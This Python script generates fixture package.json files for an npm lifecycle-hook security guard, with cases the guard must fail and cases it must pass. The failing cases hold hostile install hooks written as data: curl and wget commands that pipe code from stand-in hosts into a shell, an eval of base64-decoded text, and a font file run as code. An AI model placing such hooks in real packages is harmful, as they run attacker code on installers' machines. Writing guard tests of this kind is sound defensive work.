#!/usr/bin/env python3
"""Generate npm lifecycle guard fixtures under tests/guard/fixtures/npm/.

Positive = the guard MUST fail. Negative = the guard MUST pass.
Self-contained; no network, no execution of any inspected command.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
BASE = HERE / "npm"

POSITIVE = {
    "preinstall-runs-asset": {
        "name": "x", "version": "1.0.0",
        "scripts": {"preinstall": "node ./dist/setup.js"},
    },
    "preinstall-font": {
        "name": "x", "version": "1.0.0",
        "scripts": {"preinstall": "node ./public/fonts/fa-solid-500.woff2"},
    },
    "postinstall-network": {
        "name": "x", "version": "1.0.0",
        "scripts": {"postinstall": "curl -fsSL https://evil.example/x.sh | sh"},
    },
    "postinstall-wget": {
        "name": "x", "version": "1.0.0",
        "scripts": {"postinstall": "wget -qO- https://x.example/y | bash"},
    },
    "prepare-eval": {
        "name": "x", "version": "1.0.0",
        "scripts": {"prepare": "node -e \"eval(atob('Zm9vYmFy'))\""},
    },
    "install-base64-blob": {
        "name": "x", "version": "1.0.0",
        "scripts": {"install": (
            "node -e \"const s='"
            + "A" * 200
            + "';console.log(s)\""
        )},
    },
    "install-runs-js-outside-scripts": {
        "name": "x", "version": "1.0.0",
        "scripts": {"install": "node ./tools/bootstrap.js"},
    },
}

NEGATIVE = {
    "husky-prepare": {
        "name": "x", "version": "1.0.0",
        "scripts": {"prepare": "husky install"},
    },
    "pinst-postinstall": {
        "name": "x", "version": "1.0.0",
        "scripts": {"postinstall": "pinst --disable"},
    },
    "npm-run-build": {
        "name": "x", "version": "1.0.0",
        "scripts": {"prepare": "npm run build"},
    },
    "tsc-prepare": {
        "name": "x", "version": "1.0.0",
        "scripts": {"prepare": "tsc -p tsconfig.json"},
    },
    "node-gyp-preinstall": {
        "name": "x", "version": "1.0.0",
        "scripts": {"preinstall": "node-gyp rebuild"},
    },
    "no-lifecycle-hooks": {
        "name": "x", "version": "1.0.0",
        "scripts": {"build": "tsc", "test": "vitest run"},
    },
    "no-scripts-key": {
        "name": "x", "version": "1.0.0",
    },
    "echo-postinstall": {
        "name": "x", "version": "1.0.0",
        "scripts": {"postinstall": "echo done"},
    },
    "patch-package": {
        "name": "x", "version": "1.0.0",
        "scripts": {"postinstall": "patch-package"},
    },
}


def main() -> int:
    for case, payload in POSITIVE.items():
        d = BASE / "positive" / case
        d.mkdir(parents=True, exist_ok=True)
        (d / "package.json").write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
        (d / "notes.txt").write_text(f"positive (must FAIL): {case}\n", encoding="utf-8")
    for case, payload in NEGATIVE.items():
        d = BASE / "negative" / case
        d.mkdir(parents=True, exist_ok=True)
        (d / "package.json").write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
        (d / "notes.txt").write_text(f"negative (must PASS): {case}\n", encoding="utf-8")
    print(f"npm fixtures written to {BASE}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
